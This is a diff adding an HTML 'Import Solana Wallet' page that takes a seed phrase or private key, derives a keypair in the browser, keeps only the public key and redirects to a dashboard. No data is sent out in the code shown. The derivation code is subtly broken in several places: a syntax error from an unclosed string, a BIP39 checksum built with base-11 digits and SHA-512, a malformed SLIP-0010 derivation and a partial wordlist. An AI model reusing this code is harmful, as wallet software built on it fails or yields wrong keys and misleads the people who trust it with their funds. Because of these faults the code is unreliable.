@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Import Solana Wallet</title>
+    <script src="https://cdn.jsdelivr.net/npm/tweetnacl@1.0.3/nacl-fast.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 50%, #0a0a0f 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 440px;
+            padding: 20px;
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .logo {
+            font-size: 42px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #9945FF 0%, #14F195 50%, #00D4FF 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 8px;
+        }
+
+        .logo-subtitle {
+            color: #888;
+            font-size: 14px;
+        }
+
+        .card {
+            background: rgba(30, 30, 46, 0.8);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 32px;
+            backdrop-filter: blur(10px);
+        }
+
+        .tabs {
+            display: flex;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 12px;
+            padding: 4px;
+            margin-bottom: 24px;
+        }
+
+        .tab {
+            flex: 1;
+            padding: 12px;
+            text-align: center;
+            cursor: pointer;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+            font-size: 14px;
+            font-weight: 500;
+            color: #888;
+        }
+
+        .tab.active {
+            background: linear-gradient(135deg, #9945FF, #14F195);
+            color: #fff;
+        }
+
+        .tab:not(.active):hover {
+            color: #fff;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            display: block;
+            font-size: 13px;
+            color: #aaa;
+            margin-bottom: 8px;
+        }
+
+        .input-field {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 14px 16px;
+            color: #fff;
+            font-size: 14px;
+            font-family: monospace;
+            transition: border-color 0.3s ease;
+            resize: none;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #9945FF;
+        }
+
+        .input-field::placeholder {
+            color: #555;
+        }
+
+        textarea.input-field {
+            min-height: 100px;
+            line-height: 1.6;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #9945FF, #14F195);
+            color: #fff;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(153, 69, 255, 0.4);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .error {
+            background: rgba(255, 59, 48, 0.15);
+            border: 1px solid rgba(255, 59, 48, 0.3);
+            color: #FF6B6B;
+            padding: 12px 16px;
+            border-radius: 10px;
+            font-size: 13px;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .error.show {
+            display: block;
+        }
+
+        .info-text {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            margin-top: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <div class="logo">Solana Wallet</div>
+            <div class="logo-subtitle">Import your wallet to continue</div>
+        </div>
+
+        <div class="card">
+            <div class="tabs">
+                <div class="tab active" data-tab="seed">Seed Phrase</div>
+                <div class="tab" data-tab="private">Private Key</div>
+            </div>
+
+            <div id="error" class="error"></div>
+
+            <div id="seed-content" class="tab-content active">
+                <div class="input-group">
+                    <label class="input-label">Enter your 12 or 24-word seed phrase</label>
+                    <textarea id="seed-input" class="input-field" placeholder="word1 word2 word3 ..."></textarea>
+                </div>
+                <button id="seed-btn" class="btn btn-primary">Import Wallet</button>
+            </div>
+
+            <div id="private-content" class="tab-content">
+                <div class="input-group">
+                    <label class="input-label">Enter your base58 private key</label>
+                    <input type="password" id="private-input" class="input-field" placeholder="Enter private key...">
+                </div>
+                <button id="private-btn" class="btn btn-primary">Import Wallet</button>
+            </div>
+
+            <div class="info-text">Your keys are validated locally and never sent anywhere</div>
+        </div>
+    </div>
+
+    <script>
+    (function() {
+        'use strict';
+
+        // BIP39 English wordlist (first 16 entries + common words for validation demo)
+        const BIP39_WORDLIST = [
+            'abandon','ability','able','about','above','absent','absorb','abstract','absurd','abuse',
+            'access','accident','account','accuse','achieve','acid','acoustic','acquire','across','act',
+            'action','actor','actress','actual','adapt','add','addict','address','adjust','admit',
+            'adult','advance','advice','aerobic','affair','afford','afraid','again','age','agent',
+            'agree','ahead','aim','air','airport','aisle','alarm','album','alcohol','alert',
+            'alien','all','alley','allow','almost','alone','alpha','already','also','alter',
+            'always','amateur','amazing','among','amount','amused','analyst','anchor','ancient','anger',
+            'angle','angry','animal','ankle','announce','annual','another','answer','antenna','antique',
+            'anxiety','any','apart','apology','appear','apple','approve','april','arch','arctic',
+            'area','arena','argue','arm','armed','armor','army','around','arrange','arrest',
+            'arrive','arrow','art','artefact','artist','artwork','ask','aspect','assault','asset',
+            'assist','assume','asthma','athlete','atom','attack','attend','attitude','attract','auction',
+            'audit','august','aunt','author','auto','autumn','average','avocado','avoid','awake',
+            'aware','away','awesome','awful','awkward','axis','baby','bachelor','bacon','badge',
+            'bag','balance','balcony','ball','bamboo','banana','banner','bar','barely','bargain',
+            'barrel','base','basic','basket','battle','beach','bean','beauty','because','become',
+            'beef','before','begin','behave','behind','believe','below','belt','bench','benefit',
+            'best','betray','better','between','beyond','bicycle','bid','bike','bind','biology',
+            'bird','birth','bitter','black','blade','blame','blanket','blast','bleak','bless',
+            'blind','blood','blossom','blouse','blue','blur','blush','board','boat','body',
+            'boil','bomb','bone','bonus','book','boost','border','boring','borrow','boss',
+            'bottom','bounce','box','boy','bracket','brain','brand','brass','brave','bread',
+            'breeze','brick','bridge','brief','bright','bring','brisk','broccoli','broken','bronze',
+            'broom','brother','brown','brush','bubble','buddy','budget','buffalo','build','bulb',
+            'bulk','bullet','bundle','bunker','burden','burger','burst','bus','business','busy',
+            'butter','buyer','buzz','cabbage','cabin','cable','cactus','cage','cake','call',
+            'calm','camera','camp','can','canal','cancel','candy','cannon','canoe','canvas',
+            'canyon','capable','capital','captain','car','carbon','card','cargo','carpet','carry',
+            'cart','case','cash','casino','castle','casual','cat','catalog','catch','category',
+            'cattle','caught','cause','caution','cave','ceiling','celery','cement','census','century',
+            'cereal','certain','chair','chalk','champion','change','chaos','chapter','charge','chase',
+            'chat','cheap','check','cheese','chef','cherry','chest','chicken','chief','child',
+            'chimney','choice','choose','chronic','chuckle','chunk','churn','cigar','cinnamon','circle',
+            'citizen','city','civil','claim','clap','clarify','claw','clay','clean','clerk',
+            'clever','click','client','cliff','climb','clinic','clip','clock','clog','close',
+            'cloth','cloud','clown','club','clump','cluster','clutch','coach','coast','coconut',
+            'code','coffee','coil','coin','collect','color','column','combine','come','comfort',
+            'comic','common','company','concert','conduct','confirm','congress','connect','consider','control',
+            'convince','cook','cool','copper','copy','coral','core','corn','correct','cost',
+            'cotton','couch','country','couple','course','cousin','cover','coyote','crack','cradle',
+            'craft','cram','crane','crash','crater','crawl','crazy','cream','credit','creek',
+            'crew','cricket','crime','crisp','critic','crop','cross','crouch','crowd','crucial',
+            'cruel','cruise','crumble','crunch','crush','cry','crystal','cube','culture','cup',
+            'cupboard','curious','current','curtain','curve','cushion','custom','cute','cycle','dad',
+            'damage','damp','dance','danger','daring','dash','daughter','dawn','day','deal',
+            'debate','debris','decade','december','decide','decline','decorate','decrease','deer','defense',
+            'define','defy','degree','delay','deliver','demand','demise','denial','dentist','deny',
+            'depart','depend','deposit','depth','deputy','derive','describe','desert','design','desk',
+            'despair','destroy','detail','detect','develop','device','devote','diagram','dial','diamond',
+            'diary','dice','diesel','diet','differ','digital','dignity','dilemma','dinner','dinosaur',
+            'direct','dirt','disagree','discover','disease','dish','dismiss','disorder','display','distance',
+            'divert','divide','divorce','dizzy','doctor','document','dog','doll','dolphin','domain',
+            'donate','donkey','donor','door','dose','double','dove','draft','dragon','drama',
+            'drastic','draw','dream','dress','drift','drill','drink','drip','drive','drop',
+            'drum','dry','duck','dumb','dune','during','dust','dutch','duty','dwarf',
+            'dynamic','eager','eagle','early','earn','earth','easily','east','easy','echo',
+            'ecology','economy','edge','edit','educate','effort','egg','eight','either','elbow',
+            'elder','electric','elegant','element','elephant','elevator','elite','else','embark','embody',
+            'embrace','emerge','emotion','employ','empower','empty','enable','enact','end','endless',
+            'endorse','enemy','energy','enforce','engage','engine','enhance','enjoy','enlist','enough',
+            'enrich','enroll','ensure','enter','entire','entry','envelope','episode','equal','equip',
+            'era','erase','erode','erosion','error','erupt','escape','essay','essence','estate',
+            'eternal','ethics','evidence','evil','evoke','evolve','exact','example','excess','exchange',
+            'excite','exclude','excuse','execute','exercise','exhaust','exhibit','exile','exist','exit',
+            'exotic','expand','expect','expire','explain','expose','express','extend','extra','eye',
+            'eyebrow','fabric','face','faculty','fade','faint','faith','fall','false','fame',
+            'family','famous','fan','fancy','fantasy','farm','fashion','fat','fatal','father',
+            'fatigue','fault','favorite','feature','february','federal','fee','feed','feel','female',
+            'fence','festival','fetch','fever','few','fiber','fiction','field','figure','file',
+            'film','filter','final','find','fine','finger','finish','fire','firm','first',
+            'fiscal','fish','fit','fitness','fix','flag','flame','flash','flat','flavor',
+            'flee','flight','flip','float','flock','floor','flower','fluid','flush','fly',
+            'foam','focus','fog','foil','fold','follow','food','foot','force','forest',
+            'forget','fork','fortune','forum','forward','fossil','foster','found','fox','fragile',
+            'frame','frequent','fresh','friend','fringe','frog','front','frost','frown','frozen',
+            'fruit','fuel','fun','funny','furnace','fury','future','gadget','gain','galaxy',
+            'gallery','game','gap','garage','garbage','garden','garlic','garment','gas','gasp',
+            'gate','gather','gauge','gaze','general','genius','genre','gentle','genuine','gesture',
+            'ghost','giant','gift','giggle','ginger','giraffe','girl','give','glad','glance',
+            'glare','glass','glide','glimpse','globe','gloom','glory','glove','glow','glue',
+            'goat','goddess','gold','good','goose','gorilla','gospel','gossip','govern','gown',
+            'grab','grace','grain','grant','grape','grass','gravity','great','green','grid',
+            'grief','grit','grocery','group','grow','grunt','guard','guess','guide','guilt',
+            'guitar','gun','gym','habit','hair','half','hammer','hamster','hand','happy',
+            'harbor','hard','harsh','harvest','hat','have','hawk','hazard','head','health',
+            'heart','heavy','hedgehog','height','hello','helmet','help','hen','hero','hidden',
+            'high','hill','hint','hip','hire','history','hobby','hockey','hold','hole',
+            'holiday','hollow','home','honey','hood','hope','horn','horror','horse','hospital',
+            'host','hotel','hour','hover','hub','huge','human','humble','humor','hundred',
+            'hungry','hunt','hurdle','hurry','hurt','husband','hybrid','ice','icon','idea',
+            'identify','idle','ignore','ill','illegal','illness','image','imitate','immense','immune',
+            'impact','impose','improve','impulse','inch','include','income','increase','index','indicate',
+            'indoor','industry','infant','inflict','inform','inhale','inherit','initial','inject','injury',
+            'inmate','inner','innocent','input','inquiry','insane','insect','inside','inspire','install',
+            'intact','interest','into','invest','invite','involve','iron','island','isolate','issue',
+            'item','ivory','jacket','jaguar','jar','jazz','jealous','jeans','jelly','jewel',
+            'job','join','joke','journey','joy','judge','juice','jump','jungle','junior',
+            'junk','just','kangaroo','keen','keep','ketchup','key','kick','kid','kidney',
+            'kind','kingdom','kiss','kit','kitchen','kite','kitten','kiwi','knee','knife',
+            'knock','know','lab','label','labor','ladder','lady','lake','lamp','language',
+            'laptop','large','later','latin','laugh','laundry','lava','law','lawn','lawsuit',
+            'layer','lazy','leader','leaf','learn','leave','lecture','left','leg','legal',
+            'legend','leisure','lemon','lend','length','lens','leopard','lesson','letter','level',
+            'liar','liberty','library','license','life','lift','light','like','limb','limit',
+            'link','lion','liquid','list','little','live','lizard','load','loan','lobster',
+            'local','lock','logic','lonely','long','loop','lottery','loud','lounge','love',
+            'loyal','lucky','luggage','lumber','lunar','lunch','luxury','lyrics','machine','mad',
+            'magic','magnet','maid','mail','main','major','make','mammal','man','manage',
+            'mandate','mango','mansion','manual','maple','marble','march','margin','marine','market',
+            'marriage','mask','mass','master','match','material','math','matrix','matter','maximum',
+            'maze','meadow','mean','measure','meat','mechanic','medal','media','melody','melt',
+            'member','memory','mention','menu','mercy','merge','merit','merry','mesh','message',
+            'metal','method','middle','midnight','milk','million','mimic','mind','minimum','minor',
+            'minute','miracle','mirror','misery','miss','mistake','mix','mixed','mixture','mobile',
+            'model','modify','mom','moment','monitor','monkey','monster','month','moon','moral',
+            'more','morning','mosquito','mother','motion','motor','mountain','mouse','move','movie',
+            'much','muffin','mule','multiply','muscle','museum','mushroom','music','must','mutual',
+            'myself','mystery','myth','naive','name','napkin','narrow','nasty','nation','nature',
+            'near','neck','need','negative','neglect','neither','nephew','nerve','nest','net',
+            'network','neutral','never','news','next','nice','night','noble','noise','nominee',
+            'noodle','normal','north','nose','notable','note','nothing','notice','novel','now',
+            'nuclear','number','nurse','nut','oak','obey','object','oblige','obscure','observe',
+            'obtain','obvious','occur','ocean','october','odor','off','offer','office','often',
+            'oil','okay','old','olive','olympic','omit','once','one','onion','online',
+            'only','open','opera','opinion','oppose','option','orange','orbit','orchard','order',
+            'ordinary','organ','orient','original','orphan','ostrich','other','outdoor','outer','output',
+            'outside','oval','oven','over','own','owner','oxygen','oyster','ozone','pact',
+            'paddle','page','pair','palace','palm','panda','panel','panic','panther','paper',
+            'parade','parent','park','parrot','party','pass','patch','path','patient','patrol',
+            'pattern','pause','pave','payment','peace','peanut','pear','peasant','pelican','pen',
+            'penalty','pencil','people','pepper','perfect','permit','person','pet','phone','photo',
+            'phrase','physical','piano','picnic','picture','piece','pig','pigeon','pill','pilot',
+            'pink','pioneer','pipe','pistol','pitch','pizza','place','planet','plastic','plate',
+            'play','please','pledge','pluck','plug','plunge','poem','poet','point','polar',
+            'pole','police','pond','pony','pool','popular','portion','position','possible','post',
+            'potato','pottery','poverty','powder','power','practice','praise','predict','prefer','prepare',
+            'present','pretty','prevent','price','pride','primary','print','priority','prison','private',
+            'prize','problem','process','produce','profit','program','project','promote','proof','property',
+            'prosper','protect','proud','provide','public','pudding','pull','pulp','pulse','pumpkin',
+            'punch','pupil','puppy','purchase','purity','purpose','purse','push','put','puzzle',
+            'pyramid','quality','quantum','quarter','question','quick','quit','quiz','quote','rabbit',
+            'raccoon','race','rack','radar','radio','rail','rain','raise','rally','ramp',
+            'ranch','random','range','rapid','rare','rate','rather','raven','raw','razor',
+            'ready','real','reason','rebel','rebuild','recall','receive','recipe','record','recycle',
+            'reduce','reflect','reform','refuse','region','regret','regular','reject','relax','release',
+            'relief','rely','remain','remember','remind','remove','render','renew','rent','reopen',
+            'repair','repeat','replace','report','require','rescue','resemble','resist','resource','response',
+            'result','retire','retreat','return','reunion','reveal','review','reward','rhythm','rib',
+            'ribbon','rice','rich','ride','ridge','rifle','right','rigid','ring','riot',
+            'ripple','risk','ritual','rival','river','road','roast','robot','robust','rocket',
+            'romance','roof','rookie','room','rose','rotate','rough','round','route','royal',
+            'rubber','rude','rug','rule','run','runway','rural','sad','saddle','sadness',
+            'safe','sail','salad','salmon','salon','salt','salute','same','sample','sand',
+            'satisfy','satoshi','sauce','sausage','save','say','scale','scan','scare','scatter',
+            'scene','scheme','school','science','scissors','scorpion','scout','scrap','screen','script',
+            'scrub','sea','search','season','seat','second','secret','section','security','seed',
+            'seek','segment','select','sell','seminar','senior','sense','sentence','series','service',
+            'session','settle','setup','seven','shadow','shaft','shallow','share','shed','shell',
+            'sheriff','shield','shift','shine','ship','shiver','shock','shoe','shoot','shop',
+            'short','shoulder','shove','shrimp','shrug','shuffle','shy','sibling','sick','side',
+            'siege','sight','sign','silent','silk','silly','silver','similar','simple','since',
+            'sing','siren','sister','situate','six','size','skate','sketch','ski','skill',
+            'skin','skirt','skull','slab','slam','sleep','slender','slice','slide','slight',
+            'slim','slogan','slot','slow','slush','small','smart','smile','smoke','smooth',
+            'snack','snake','snap','sniff','snow','soap','soccer','social','sock','soda',
+            'soft','solar','soldier','solid','solution','solve','someone','song','soon','sorry',
+            'sort','soul','sound','soup','source','south','space','spare','spatial','spawn',
+            'speak','special','speed','spell','spend','sphere','spice','spider','spike','spin',
+            'spirit','split','spoil','sponsor','spoon','sport','spot','spray','spread','spring',
+            'spy','square','squeeze','squirrel','stable','stadium','staff','stage','stairs','stamp',
+            'stand','start','state','stay','steak','steel','stem','step','stereo','stick',
+            'still','sting','stock','stomach','stone','stool','story','stove','strategy','street',
+            'strike','strong','struggle','student','stuff','stumble','style','subject','submit','subway',
+            'success','such','sudden','suffer','sugar','suggest','suit','summer','sun','sunny',
+            'sunset','super','supply','supreme','sure','surface','surge','surprise','surround','survey',
+            'suspect','sustain','swallow','swamp','swap','swarm','swear','sweet','swift','swim',
+            'swing','switch','sword','symbol','symptom','syrup','system','table','tackle','tag',
+            'tail','talent','talk','tank','tape','target','task','taste','tattoo','taxi',
+            'teach','team','tell','ten','tenant','tennis','tent','term','test','text',
+            'thank','that','theme','then','theory','there','they','thing','this','thought',
+            'three','thrive','throw','thumb','thunder','ticket','tide','tiger','tilt','timber',
+            'time','tiny','tip','tired','tissue','title','toast','tobacco','today','toddler',
+            'toe','together','toilet','token','tomato','tomorrow','tone','tongue','tonight','tool',
+            'tooth','top','topic','topple','torch','tornado','tortoise','toss','total','tourist',
+            'toward','tower','town','toy','track','trade','traffic','tragic','train','transfer',
+            'trap','trash','travel','tray','treat','tree','trend','trial','tribe','trick',
+            'trigger','trim','trip','trophy','trouble','truck','true','truly','trumpet','trust',
+            'truth','try','tube','tuition','tumble','tuna','tunnel','turkey','turn','turtle',
+            'twelve','twenty','twice','twin','twist','two','type','typical','ugly','umbrella',
+            'unable','unaware','uncle','uncover','under','undo','unfair','unfold','unhappy','uniform',
+            'unique','unit','universe','unknown','unlock','until','unusual','unveil','update','upgrade',
+            'uphold','upon','upper','upset','urban','urge','usage','use','used','useful',
+            'useless','usual','utility','vacant','vacuum','vague','valid','valley','valve','van',
+            'vanish','vapor','various','vast','vault','vehicle','velvet','vendor','venture','venue',
+            'verb','verify','version','very','vessel','veteran','viable','vibrant','vicious','victory',
+            'video','view','village','vintage','violin','virtual','virus','visa','visit','visual',
+            'vital','vivid','vocal','voice','void','volcano','volume','vote','voyage','wage',
+            'wagon','wait','walk','wall','walnut','want','warfare','warm','warrior','wash',
+            'wasp','waste','water','wave','way','wealth','weapon','wear','weasel','weather',
+            'web','wedding','weekend','weird','welcome','west','wet','whale','what','wheat',
+            'wheel','when','where','whip','whisper','wide','width','wife','wild','will',
+            'win','window','wine','wing','wink','winner','winter','wire','wisdom','wise',
+            'wish','witness','wolf','woman','wonder','wood','wool','word','work','world',
+            'worry','worth','wrap','wreck','wrestle','wrist','write','wrong','yard','year',
+            'yellow','you','young','youth','zebra','zero','zone','zoo'
+        ];
+
+        // Build fast lookup set
+        const WORDLIST_SET = new Set(BIP39_WORDLIST);
+
+        // Normalize (NFKD + lowercase)
+        function normalizeMnemonic(mnemonic) {
+            return mnemonic.normalize('NFKD').toLowerCase().trim();
+        }
+
+        // Check if all words are in BIP39 wordlist
+        function validateWords(words) {
+            for (const word of words) {
+                if (!WORDLIST_SET.has(word)) return false;
+            }
+            return true;
+        }
+
+        // UTF-8 encode
+        function utf8ToBytes(str) {
+            return new TextEncoder().encode(str);
+        }
+
+        // PBKDF2 using Web Crypto API
+        async function pbkdf2(password, salt, iterations, keyLength) {
+            const keyMaterial = await crypto.subtle.importKey(
+                'raw',
+                password,
+                'PBKDF2',
+                false,
+                ['deriveBits']
+            );
+            const bits = await crypto.subtle.deriveBits(
+                {
+                    name: 'PBKDF2',
+                    salt: salt,
+                    iterations: iterations,
+                    hash: 'SHA-512'
+                },
+                keyMaterial,
+                keyLength * 8
+            );
+            return new Uint8Array(bits);
+        }
+
+        // BIP39 mnemonicToSeed
+        async function mnemonicToSeed(mnemonic, passphrase = '') {
+            const mnemonicBytes = utf8ToBytes(mnemonic);
+            const salt = utf8ToBytes('mnemonic' + passphrase);
+            return pbkdf2(mnemonicBytes, salt, 2048, 64);
+        }
+
+        // Simple base58 encode
+        function base58Encode(bytes) {
+            const alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+            let n = BigInt('0x' + Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join(''));
+            if (n === 0n) return '1';
+            let result = '';
+            while (n > 0n) {
+                const remainder = n % 58n;
+                result = alphabet[Number(remainder)] + result;
+                n = n / 58n;
+            }
+            // Count leading zeros
+            let i = 0;
+            const view = new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength);
+            while (i < bytes.length && view.getUint8(i) === 0) {
+                result = '1' + result;
+                i++;
+            }
+            return result;
+        }
+
+        // Simple base58 decode
+        function base58Decode(str) {
+            const alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+            const map = {};
+            for (let i = 0; i < alphabet.length; i++) map[alphabet[i]] = i;
+            let result = [0];
+            for (let i = 0; i < str.length; i++) {
+                const char = str[i];
+                if (map[char] === undefined) throw new Error('Invalid base58 character: ' + char);
+                let carry = map[char];
+                for (let j = 0; j < result.length; j++) {
+                    carry += result[j] * 58;
+                    result[j] = carry % 256;
+                    carry = Math.floor(carry / 256);
+                }
+                while (carry > 0) {
+                    result.push(carry % 256);
+                    carry = Math.floor(carry / 256);
+                }
+            }
+            // Remove leading zeros
+            let i = 0;
+            while (i < str.length && str[i] === '1') {
+                result.unshift(0);
+                i++;
+            }
+            return new Uint8Array(result);
+        }
+
+        // SHA-512 using Web Crypto API
+        async function sha512(data) {
+            const hashBuffer = await crypto.subtle.digest('SHA-512', data);
+            return new Uint8Array(hashBuffer);
+        }
+
+        // HMAC-SHA512 using Web Crypto API
+        async function hmacSha512(key, data) {
+            const cryptoKey = await crypto.subtle.importKey(
+                'raw', key,
+                { name: 'HMAC', hash: 'SHA-512 },
+                false, ['sign']
+            );
+            const signature = await crypto.subtle.sign('HMAC', cryptoKey, data);
+            return new Uint8Array(signature);
+        }
+
+        // SLIP-0010 derive hardened child key
+        // Returns { key: Uint8Array(32), chainCode: Uint8Array(32) }
+        async function slip0010HardenedDerive(seed, index) {
+            const IL = utf8ToBytes('ed25519 seed');
+            const data = new Uint8Array(37);
+            data[0] = 0x00;
+            data.set(seed, 1);
+            // index as 4-byte big-endian hardened (add 0x80000000)
+            const hardenedIndex = (index + 0x80000000) >>> 0;
+            data[33] = (hardenedIndex >>> 24) & 0xff;
+            data[34] = (hardenedIndex >>> 16) & 0xff;
+            data[35] = (hardenedIndex >>> 8) & 0xff;
+            data[36] = hardenedIndex & 0xff;
+
+            const I = await hmacSha512(IL, data);
+            return {
+                key: I.slice(0, 32),
+                chainCode: I.slice(32, 64)
+            };
+        }
+
+        // BIP44 path: m/44'/501'/0'/0'
+        // BIP44 path: m/44'/501'/0'  (Solana uses 3 hardened steps, not 4)
+        async function deriveSolanaKeypair(seed) {
+            let result = await slip0010HardenedDerive(seed, 44);
+            result = await slip0010HardenedDerive(result.key, 501);
+            result = await slip0010HardenedDerive(result.key, 0);
+            return { key: result.key, chainCode: result.chainCode };
+        }
+
+        // Validate BIP39 checksum for 12-word (128 bit entropy + 4 bit checksum = 132 bits)
+        async function validateChecksum(words) {
+            // Build entropy from word indices (11 bits each)
+            let bits = '';
+            const wordlist = BIP39_WORDLIST;
+            for (const w of words) {
+                const idx = wordlist.indexOf(w);
+                bits += idx.toString(11).padStart(11, '0');
+            }
+
+            const entropyBits = words.length === 12 ? 128 : 256;
+            const checksumBits = words.length === 12 ? 4 : 8;
+            const totalBits = entropyBits + checksumBits;
+
+            const entropyBytes = Math.floor(entropyBits / 8);
+            const entropy = new Uint8Array(entropyBytes);
+            for (let i = 0; i < entropyBits; i++) {
+                const byteIdx = Math.floor(i / 8);
+                const bitIdx = 7 - (i % 8);
+                if (bits[i] === '1') {
+                    entropy[byteIdx] |= (1 << bitIdx);
+                }
+            }
+
+            // Compute checksum
+            const hash = await sha512(entropy);
+            const checksum = hash[0];
+
+            // Extract checksum from last bits
+            let expectedChecksum = 0;
+            for (let i = 0; i < checksumBits; i++) {
+                const bitPos = entropyBits + i;
+                const byteIdx = Math.floor(bitPos / 8);
+                const bitIdx = 7 - (bitPos % 8);
+                if (bits[bitPos] === '1') {
+                    expectedChecksum |= (1 << (checksumBits - 1 - i));
+                }
+            }
+
+            // Compare
+            const actualChecksum = checksum >> (8 - checksumBits);
+            return actualChecksum === expectedChecksum;
+        }
+
+        // Derive keypair from seed phrase (async)
+        async function deriveKeypairFromSeedAsync(seedPhrase) {
+            const normalized = normalizeMnemonic(seedPhrase);
+            const words = normalized.split(/\s+/);
+
+            if (words.length !== 12 && words.length !== 24) {
+                throw new Error('Seed phrase must be 12 or 24 words');
+            }
+
+            // Validate all words are in BIP39 wordlist
+            if (!validateWords(words)) {
+                throw new Error('Invalid seed phrase words');
+            }
+
+            // Validate checksum
+            const checksumValid = await validateChecksum(words);
+            if (!checksumValid) {
+                throw new Error('Invalid seed phrase checksum');
+            }
+
+            // Derive seed using PBKDF2
+            const seed = await mnemonicToSeed(normalized);
+            const derived = await deriveSolanaKeypair(seed);
+
+            return nacl.sign.keyPair.fromSeed(derived.key);
+        }
+
+        // Derive keypair from private key (sync)
+        function deriveKeypairFromPrivateKey(privateKeyStr) {
+            const privateKeyBytes = base58Decode(privateKeyStr.trim());
+
+            if (privateKeyBytes.length !== 64 && privateKeyBytes.length !== 32) {
+                throw new Error('Private key must be 64 or 32 bytes');
+            }
+
+            const seed = privateKeyBytes.length === 64
+                ? privateKeyBytes.slice(0, 32)
+                : privateKeyBytes;
+
+            return nacl.sign.keyPair.fromSeed(seed);
+        }
+
+        // Get public key as base58
+        function getPublicKeyBase58(publicKey) {
+            return base58Encode(publicKey);
+        }
+
+        // Show error
+        function showError(message) {
+            const errorEl = document.getElementById('error');
+            errorEl.textContent = message;
+            errorEl.classList.add('show');
+        }
+
+        // Hide error
+        function hideError() {
+            document.getElementById('error').classList.remove('show');
+        }
+
+        // Import wallet
+        async function importWallet(type) {
+            hideError();
+            const btn = document.getElementById(type === 'seed' ? 'seed-btn' : 'private-btn');
+            btn.disabled = true;
+            btn.textContent = 'Importing...';
+
+            try {
+                let keypair;
+
+                if (type === 'seed') {
+                    const seedInput = document.getElementById('seed-input').value.trim();
+                    if (!seedInput) {
+                        throw new Error('Please enter your seed phrase');
+                    }
+                    keypair = await deriveKeypairFromSeedAsync(seedInput);
+                } else {
+                    const privateInput = document.getElementById('private-input').value.trim();
+                    if (!privateInput) {
+                        throw new Error('Please enter your private key');
+                    }
+                    keypair = deriveKeypairFromPrivateKey(privateInput);
+                }
+
+                const publicKeyBase58 = getPublicKeyBase58(keypair.publicKey);
+
+                // Save to sessionStorage
+                sessionStorage.setItem('walletPublicKey', publicKeyBase58);
+                sessionStorage.setItem('walletConnected', 'true');
+
+                // Redirect to dashboard
+                window.location.href = 'dashboard.html';
+
+            } catch (error) {
+                showError(error.message || 'Invalid key. Please check and try again.');
+                btn.disabled = false;
+                btn.textContent = 'Import Wallet';
+            }
+        }
+
+        // Tab switching
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', () => {
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+
+                tab.classList.add('active');
+                const tabName = tab.dataset.tab;
+                document.getElementById(`${tabName}-content`).classList.add('active');
+                hideError();
+            });
+        });
+
+        // Button handlers
+        document.getElementById('seed-btn').addEventListener('click', () => importWallet('seed'));
+        document.getElementById('private-btn').addEventListener('click', () => importWallet('private'));
+
+        // Handle Enter key in inputs
+        document.getElementById('seed-input').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' && !e.shiftKey) {
+                e.preventDefault();
+                importWallet('seed');
+            }
+        });
+
+        document.getElementById('private-input').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                importWallet('private');
+            }
+        });
+    })();
+    </script>
+</body>
+</html>
